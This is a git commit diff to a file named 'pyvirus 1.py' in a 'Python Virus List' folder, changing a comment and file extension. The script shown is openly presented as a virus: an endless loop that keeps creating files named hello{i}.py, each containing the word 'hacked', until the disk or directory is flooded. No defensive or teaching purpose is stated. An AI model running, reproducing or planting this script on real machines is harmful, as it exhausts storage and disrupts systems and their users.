e5ffa9191039c946eaf952a1b5eb9ca880586c19
kelvinK1ko <88581668+kelvinK1ko@users.noreply.github.com>
2021-08-12 06:05:58 +0100

    Update pyvirus 1.py

--- Python Virus List/pyvirus 1.py
+++ Python Virus List/pyvirus 1.py
@@ -1,7 +1,7 @@
-#This script make unlimied files.
+#This script make unlimied python files
 i = 1
 while(i>0):
   i = i+1
-  file = open(f"hello{i}.vasta","w")
+  file = open(f"hello{i}.py","w")
   file.write("hacked")
   file.close()
